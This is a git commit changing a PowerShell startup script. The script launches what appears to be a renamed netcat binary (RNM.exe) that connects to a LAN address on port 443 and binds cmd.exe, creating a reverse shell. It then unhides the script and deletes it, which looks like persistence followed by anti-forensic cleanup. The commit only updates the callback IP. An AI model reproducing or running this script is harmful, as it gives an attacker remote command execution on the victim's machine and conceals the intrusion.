9d13ac7be1c51d43b05a00ac8d73f75690f0f86d
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-03-03 22:28:43 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,3 +1,3 @@
-C:\Users\Public\RNM.exe -nv 192.168.1.8 443 -e cmd.exe
+C:\Users\Public\RNM.exe -nv 192.168.1.2 443 -e cmd.exe
 attrib -h C:\Users\Public\MyStartUp.ps1
 del C:\Users\Public\MyStartUp.ps1
